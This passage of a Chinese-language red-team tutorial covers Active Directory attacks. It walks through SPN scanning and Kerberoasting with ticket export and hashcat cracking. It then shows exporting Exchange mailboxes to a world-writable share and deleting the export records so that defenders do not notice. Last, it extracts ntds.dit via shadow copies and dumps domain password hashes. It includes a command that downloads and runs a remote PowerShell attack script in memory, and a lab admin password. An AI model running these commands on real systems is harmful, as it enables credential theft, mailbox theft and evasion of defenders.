<h4 id="Powershell-AD-Recon"><a href="#Powershell-AD-Recon" class="headerlink" title="Powershell-AD-Recon"></a>Powershell-AD-Recon</h4><p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM</p>
<p>Powershell-AD-Recon 下载地址：<a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
<p>Powershell-AD-Recon 工具包里的内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">Discover-PSInterestingServices	# 查找所有 SPN 服务Discover-PSMSExchangeServers		# 查找 Exchange 服务器Discover-PSMSSQLServers         # 查找 MSSQL 服务器Find-PSServiceAccounts          # 查找服务账户Get-DomainKerberosPolicy        # 获取域 Kerberos 策略Get-PSADForestInfo              # 获取域森林信息Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>下载后的文件是没有 .ps1 后缀的，需要自己添加上</p>
</blockquote>
<p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。</p>
<p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSMSSQLServers.ps1Discover-PSMSSQLServers或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>扫描域中所有的 SPN 信息</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSInterestingServices.ps1Discover-PSInterestingServices或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。</p>
<p>kerberoast 下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;GetUserSPNs.ps1或者PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p>
<pre class="line-numbers language-none"><code class="language-none">cscript.exe GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="PowerShellery"><a href="#PowerShellery" class="headerlink" title="PowerShellery"></a>PowerShellery</h4><p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p>
<p>PowerShellery 下载地址：<a target="_blank" rel="noopener" href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search *或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>结果也可以转换为表格的形式，以便于浏览</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search * -List yes或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-DomainSpn.psm1Get-DomainSpn或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>Impacket 下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p>
<pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906144640.png"></p>
<h2 id="2、kerberoast"><a href="#2、kerberoast" class="headerlink" title="2、kerberoast"></a>2、kerberoast</h2><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p>
<p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p>
<p>kerberoast 的利用思路：</p>
<p>1、查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p>
<p>2、请求并导出 TGS</p>
<p>3、对 TGS 进行爆破</p>
<p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p>
<p>手动注册 SPN</p>
<pre class="line-numbers language-none"><code class="language-none">setspn -A MSSQLSvc&#x2F;DBSRV.teamssix.com:1433 test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看用户所对应的 SPN</p>
<pre class="line-numbers language-none"><code class="language-none">setspn -L teamssix.com\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p>
<p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test</p>
<pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p>
<p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5</p>
<pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>请求指定 SPN 的服务票据</p>
<pre class="line-numbers language-none"><code class="language-none">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DBSRV.teamssix.com&#39;
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>或者请求所有服务的服务票据</p>
<pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel  
setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p>
<p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;EmpireProject&#x2F;Empire&#x2F;6ee7e036607a62b0192daed46d3711afc65c3921&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用 Rubeus 获取票据</p>
<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以使用 impacket 获取票据</p>
<pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png"></p>
<p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p>
<p>Kerberoast 脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
<pre class="line-numbers language-none"><code class="language-none">python tgsreperack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113300.png"></p>
<h1 id="0x25-Exchange-邮件服务器"><a href="#0x25-Exchange-邮件服务器" class="headerlink" title="0x25 Exchange 邮件服务器"></a>0x25 Exchange 邮件服务器</h1><h2 id="1、Exchange-的基本操作"><a href="#1、Exchange-的基本操作" class="headerlink" title="1、Exchange 的基本操作"></a>1、Exchange 的基本操作</h2><blockquote>
<p>在 Exchange 服务器上的 PowerShell 里进行以下操作</p>
</blockquote>
<p>将 Exchange 管理单元添加到当前会话中</p>
<pre class="line-numbers language-none"><code class="language-none">add-pssnapin microsoft.exchange*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看邮件数据库</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -server &quot;dc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询数据库的物理路径</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -Identity &#39;Mailbox Database 0761701514&#39; | Format-List Name,EdbFilePath,LogFolderPath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获取现有用户的邮件地址</p>
<pre class="line-numbers language-none"><code class="language-none">Get-Mailbox | Format-table Name,WindowsEmailAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看指定用户的邮箱使用信息</p>
<pre class="line-numbers language-none"><code class="language-none">Get-Mailboxstatistics -Identity Administrator | Select Dispayname,ItemCount,TotalItemSize,TotalTimeSize,LastLogonTime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获取用户邮箱中的邮件数量，通过该命令还可以列出那些用户未登录过邮箱</p>
<pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -ResultSize Unlimited | Get-Mailboxstatistics | Sort-Object TotalItemSize -Descend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、导出指定的电子邮箱"><a href="#2、导出指定的电子邮箱" class="headerlink" title="2、导出指定的电子邮箱"></a>2、导出指定的电子邮箱</h2><p>Exchange Server 2007 中需要使用 ExportMailBox 命令，在 Exchange Server 2010 SP1 及以后的版本中可以使用图形化界面导出，也可以使用 PowerShell</p>
<p>如果想要导出 PTS 格式的邮件文件，则需要为用户配置导出/导出权限。</p>
<h3 id="配置用户的导入导出权限"><a href="#配置用户的导入导出权限" class="headerlink" title="配置用户的导入导出权限"></a>配置用户的导入导出权限</h3><p>查看用户权限</p>
<pre class="line-numbers language-none"><code class="language-none">Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将 Administrator 用户添加到 Mailbox Import Export  角色组里，将用户添加到角色组后，需要重启 Exchange 服务才能执行导出操作</p>
<pre class="line-numbers language-none"><code class="language-none">New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除刚刚添加的 Mailbox Import Export 角色组中的用户</p>
<pre class="line-numbers language-none"><code class="language-none">Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h3><p>不论使用哪种方式导出邮件，都需要将文件放置在 UNC（Universal Naming Convention，通用命名规则，也称通用命名规范）路径下</p>
<p>类似于 “\hostname\sharename”、“\ipaddress\sharename” 的网络路径下，sharename 为网络共享名称。</p>
<p>首先开启共享，将 C 盘 inetpub 文件夹设置为 everyone 可读写，执行如下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">net share inetpub&#x3D;c:\inetpub &#x2F;grant:everyone,full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h3><p>使用 PowerShell 导出电子邮件，用户的电子邮箱目录一般为Inbox（收件箱）、SentItems（已发送邮件）、DeleteItems（已删除邮件）、Drafts（草稿）等</p>
<pre class="line-numbers language-none"><code class="language-none">New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.7.77\inetpub\administrator.pst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用图形化界面导出电子邮件，访问 <a target="_blank" rel="noopener" href="https://127.0.0.1/ecp%EF%BC%8C%E6%89%93%E5%BC%80">https://127.0.0.1/ecp，打开</a> Exchange 管理中心的登录界面。</p>
<p>输入账号密码进入 Exchange 管理中心，点击「…」更多按钮，选择「导出到 PST 文件」即可进行导出操作。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908104558.png"></p>
<h3 id="管理导出请求"><a href="#管理导出请求" class="headerlink" title="管理导出请求"></a>管理导出请求</h3><p>不论是通过 Powershell 导出还是通过图形化的方式导出，都会在 Exchange 中生成一条告警信息，这些信息有助于 BT 发现服务器里的异常行为，通过以下命令，可以查看之前的导出请求记录信息。</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将指定用户已经完成的导出请求删除</p>
<pre class="line-numbers language-none"><code class="language-none">Remove-MailboxExportRequest -Identity Administrator\MailboxExport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除所有已完成的导出请求</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除所有导出请求，包括完成和失败的请求</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="0x26-ntds-dit-的提取与散列值导出"><a href="#0x26-ntds-dit-的提取与散列值导出" class="headerlink" title="0x26 ntds.dit 的提取与散列值导出"></a>0x26 ntds.dit 的提取与散列值导出</h1><h2 id="0、前言-6"><a href="#0、前言-6" class="headerlink" title="0、前言"></a>0、前言</h2><p>在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %SystemRoot%\ntds.dit</p>
<p>ntds.dit 中包含（但不限于）用户名、散列值、组、GPP、OU 等与活动目录相关的信息，因此如果我们拿到 ntds.dit 就能获取到域内所有用户的 hash</p>
<p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。</p>
<p>不过使用 Windows 本地卷影拷贝服务，就可以获得文件的副本（类似于虚拟机的快照）</p>
<h2 id="1、使用卷影拷贝服务提取-ntds-dit"><a href="#1、使用卷影拷贝服务提取-ntds-dit" class="headerlink" title="1、使用卷影拷贝服务提取 ntds.dit"></a>1、使用卷影拷贝服务提取 ntds.dit</h2><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h3><p>ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p>
<p>该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>加载刚刚创建的快照</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;mount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 copy 命令将快照中的文件复制到 C 盘下</p>
<pre class="line-numbers language-none"><code class="language-none">copy C:\$SNAP_202109081356_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除之前加载的快照</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;unmount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; &quot;delete &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询当前系统中的快照，可以看到没有任何快照</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908135855.png"></p>
<h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h3><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p>
<p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p>
<pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在创建的卷影拷贝中将 ntds.dit 复制出来</p>
<pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除快照</p>
<pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908145721.png"></p>
<h3 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h3><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p>
<p>vssown.vbs 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p>
<p>启动卷影拷贝服务</p>
<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>创建一个 C 盘的卷影拷贝</p>
<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>列出当前卷影拷贝</p>
<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>复制 ntds.dit</p>
<pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除卷影拷贝</p>
<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908152359.png"></p>
<h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p>
<p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p>
<p>在域控中以管理员模式打开命令行环境，输入命令</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p>
<p>将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除</p>
<pre class="line-numbers language-none"><code class="language-none">rmdir &#x2F;s&#x2F;q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Copy-VSS.ps1Copy-vss或者PowerShell -Exec bypass -C &quot;Import-module .\Copy-VSS.ps1;Copy-vss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。</p>
<h3 id="diskshadow"><a href="#diskshadow" class="headerlink" title="diskshadow"></a>diskshadow</h3><p>diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。</p>
<blockquote>
<p>diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作</p>
</blockquote>
<p>首先创建一个 txt 文件，内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;C:\windows\system32\cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\ntds.ditdelete shadows alllist shadows allresetexit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 diskshadow 调用刚才的文本文件</p>
<pre class="line-numbers language-none"><code class="language-none">diskshadow &#x2F;s C:\command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p>
<pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908155944.png"></p>
<h3 id="Invoke-NinjaCopy-ps1"><a href="#Invoke-NinjaCopy-ps1" class="headerlink" title="Invoke-NinjaCopy.ps1"></a>Invoke-NinjaCopy.ps1</h3><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p>
<p>PowerSploit 工具包项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>impacket 安装</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.gitcd impacketpython3 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>通过 impacket  里的 secretsdump.py 脚本可以直接远程读取 ntds.dit 并导出哈希值</p>
<pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、导出-ntds-dit-文件中的散列值"><a href="#2、导出-ntds-dit-文件中的散列值" class="headerlink" title="2、导出 ntds.dit 文件中的散列值"></a>2、导出 ntds.dit 文件中的散列值</h2><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>安装 esedbexport，以 Kali 为例</p>
<pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-configwget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20210424&#x2F;libesedb-experimental-20210424.tar.gztar zxvf libesedb-experimental-20210424.tar.gzcd libesedb-20210424.&#x2F;configuremakemake installldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>导出 ntds.dit</p>
<pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安装 ntdsxtract</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.gitcd ntdsxtractpython setup.py buildpython setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p>
<pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export&#x2F;datatable.3 ntds.dit.export&#x2F;link_table.5 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908171420.png"></p>
<p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p>
<pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将 ntds.dit.export 和 SYSTEM 文件放入到 impacket 工具的文件夹中</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者直接使用 python 执行 secretsdump.py 文件</p>
<pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9
python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

